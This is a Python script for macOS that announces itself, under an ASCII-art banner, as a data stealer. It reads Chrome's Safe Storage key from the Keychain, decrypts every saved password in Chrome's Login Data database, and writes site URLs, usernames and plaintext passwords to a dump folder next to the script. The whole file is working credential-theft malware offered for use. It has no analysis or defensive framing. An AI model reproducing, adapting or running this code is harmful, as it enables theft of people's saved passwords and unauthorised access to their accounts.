#Works on mac
import os
from os.path import expanduser
import sqlite3
import binascii
import subprocess
import hashlib
import base64

print("""
Stealing Ya' Data since 2019

           nom, nom, yummy apple data
___________________________$$
 _________________________$$$$
 _______________________$$$$$$
 ______________________$$$$$$
 ______________________$$$$
 ______________________$$
 _________$$$$$$$$$$$$$_$$$$$$$$$$$$$
 ______$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ____$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ___$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 __$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 _$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 _$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 _$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 _$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 __$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ___$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ____$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 _____$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ______$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ________$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 __________$$$$$$$$$$$$$$$$$$$$$$$$$
 ____________$$$$$$$$$$$$$$$$$$$$$
 ______________$$$$$$$$__$$$$$$

made by TheStandardPancake, The Mac Edition!

""")
#this version for mac was made pretty much entirely by me this time, though still I give some credit to bluedangerforyou for inspiration
#Also credit to thanatoskira for the process of decrypting mac key style encryptions

#setting up the file to dump info
usb = os.path.abspath(__file__)
os.makedirs(os.path.join(usb + " Chrome Dump"))
path = os.path.join(usb + " Chrome Dump")

#labels for easy use in the file
username1 = "Username: "
siteId = "Site ID: "
password_field = "Password: "

#The magic happens
safeStorageKey = subprocess.check_output("security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'", shell=True).replace("\n", "").replace("\"", "")

f = open(os.path.join(path,"passwordsusers.txt"), "w")
conn = sqlite3.connect(expanduser("~/Library/Application Support/Google/Chrome/Default/Login Data"))
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')

def decrypting(encrypted, iv):
    hexKey = binascii.hexlify(hashlib.pbkdf2_hmac('sha1',safeStorageKey, b"saltysalt", 1003)[:16])
    hexEncPassword = base64.b64encode(encrypted[3:])
    decrypted = subprocess.check_output("openssl enc -base64 -d -aes-128-cbc -iv '%s' -K %s <<< %s 2>/dev/null" % (iv, hexKey, hexEncPassword), shell=True)
    return decrypted

for result in cursor.fetchall():
	password = decrypting(result[2], iv = ''.join(('20',) * 16))
	f.writelines(siteId + str(result[0]) + '\n' + username1 + str(result[1]) + '\n' + password_field + password + '\n' + '--------------------------------' + '\n')
f.close()
